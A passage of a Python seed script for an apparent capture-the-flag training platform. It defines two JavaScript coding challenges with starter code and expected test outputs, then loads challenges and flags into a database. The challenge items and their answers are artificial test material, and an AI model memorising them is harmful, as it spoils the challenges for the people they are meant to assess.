            "starter_code": "function chunkArray(nums, size) {\n  // split nums into consecutive chunks of length `size`\n  // (the last chunk may be shorter if nums doesn't divide evenly)\n}\n",
            "instructions": "size will always be a positive integer. An empty array returns an empty array of chunks.",
            "tests": [
                {"args": [[1, 2, 3, 4, 5], 2], "expect": [[1, 2], [3, 4], [5]]},
                {"args": [[1, 2, 3, 4], 2], "expect": [[1, 2], [3, 4]]},
                {"args": [[], 3], "expect": []},
                {"args": [[1, 2, 3], 5], "expect": [[1, 2, 3]]},
                {"args": [[1, 2, 3, 4, 5, 6], 3], "expect": [[1, 2, 3], [4, 5, 6]]},
            ],
            "flag": batch_it_up["flag"],
        },
    )

    fixed_width_hex = by_title["Ported From C: Fixed-Width Hex"]
    fixed_width_hex["description"] = _coding_description(
        "Before JavaScript had padStart, C programs reached for "
        "printf(\"%0*x\", width, n) to zero-pad a number into fixed-width "
        "lowercase hex. Recreate that formatting.",
        {
            "function_name": "toFixedHex",
            "language": "javascript",
            "starter_code": "function toFixedHex(n, width) {\n  // return n formatted as lowercase hex, left-padded with zeros to at least `width` characters\n}\n",
            "instructions": "If the natural hex form is already at least `width` characters, return it unpadded (don't truncate) - same behavior as String.prototype.padStart.",
            "tests": [
                {"args": [255, 4], "expect": "00ff"},
                {"args": [0, 2], "expect": "00"},
                {"args": [4096, 2], "expect": "1000"},
                {"args": [10, 1], "expect": "a"},
                {"args": [16, 4], "expect": "0010"},
            ],
            "flag": fixed_width_hex["flag"],
        },
    )

    for c in CHALLENGES:
        if "web_config" in c:
            c["web_config"]["secret"] = c["flag"]


def seed():
    with app.app_context():
        db.create_all()
        columns = {column["name"] for column in db.inspect(db.engine).get_columns("challenge")}
        if "flag_template" not in columns:
            with db.engine.begin() as connection:
                connection.execute(db.text("ALTER TABLE challenge ADD COLUMN flag_template VARCHAR(255)"))
        if "ai_config" not in columns:
            with db.engine.begin() as connection:
                connection.execute(db.text("ALTER TABLE challenge ADD COLUMN ai_config TEXT"))
        if "quiz_config" not in columns:
            with db.engine.begin() as connection:
                connection.execute(db.text("ALTER TABLE challenge ADD COLUMN quiz_config TEXT"))
        if "terminal_disabled_commands" not in columns:
            with db.engine.begin() as connection:
                connection.execute(db.text("ALTER TABLE challenge ADD COLUMN terminal_disabled_commands TEXT"))

        _finalize_challenges()

        created = 0
        for c in CHALLENGES:
            existing = Challenge.query.filter_by(title=c["title"]).first()
            if existing:
                if c.get("flag"):
                    existing.flag_hash = Challenge.hash_flag(c["flag"])
                    existing.flag_template = c["flag"]
                if c.get("type") == "web":
                    existing.type = "web"
                    existing.category = c.get("category", existing.category)
                    existing.description = c.get("description", existing.description)
                    existing.hint = c.get("hint", existing.hint)
                    existing.web_config = json.dumps(c.get("web_config", {}))
                    existing.rules = c.get("rules")
                    existing.difficulty = c.get("difficulty", existing.difficulty)
                    existing.points = c.get("points", existing.points)
                    print(f"upgraded to web lab: {c['title']}")
                elif c.get("type") == "ai":
                    existing.type = "ai"
                    existing.category = c.get("category", existing.category)
                    existing.description = c.get("description", existing.description)
                    existing.hint = c.get("hint", existing.hint)
                    existing.ai_config = json.dumps(c.get("ai_config", {}))
                    existing.rules = c.get("rules")
                    existing.difficulty = c.get("difficulty", existing.difficulty)
                    existing.points = c.get("points", existing.points)
                    print(f"upgraded to AI challenge: {c['title']}")
                elif c.get("type") == "terminal":
                    existing.terminal_fs = json.dumps(c.get("terminal_fs", {}))
                    existing.terminal_disabled_commands = (
                        json.dumps(c["disabled_commands"]) if c.get("disabled_commands") else None
                    )
                    existing.description = c.get("description", existing.description)
                    print(f"refreshed terminal content: {c['title']}")
                elif c["title"] in ("Caesar's Problem", "Double Wrapped"):
                    existing.description = c["description"]
                    existing.hint = c.get("hint", existing.hint)
                    print(f"updated challenge text: {c['title']}")
                elif "[[coding-task]]" in c.get("description", ""):
                    existing.description = c["description"]
                    print(f"refreshed coding task: {c['title']}")
                else:
                    print(f"refreshed flag: {c['title']}")
                continue

            challenge = Challenge(
                title=c["title"],
                category=c["category"],
                type=c.get("type", "standard"),
                description=c["description"],
                points=c["points"],
                difficulty=c.get(
                    "difficulty",
                    "easy" if c["points"] <= 100 else "medium" if c["points"] <= 200 else "hard",
                ),
                flag_hash=Challenge.hash_flag(c["flag"]),
                flag_template=c["flag"],
                hint=c.get("hint"),
                terminal_fs=json.dumps(c["terminal_fs"]) if c.get("terminal_fs") else None,
                terminal_disabled_commands=json.dumps(c["disabled_commands"]) if c.get("disabled_commands") else None,
                web_config=json.dumps(c["web_config"]) if c.get("web_config") else None,
                ai_config=json.dumps(c["ai_config"]) if c.get("ai_config") else None,
                quiz_config=json.dumps(c["quiz_config"]) if c.get("quiz_config") else None,
            )
            db.session.add(challenge)
            created += 1
            print(f"added: {c['title']} [{c['category']}] -> {c['flag']}")

        db.session.commit()
        print(f"\nDone. {created} challenge(s) added.")


if __name__ == "__main__":
    seed()
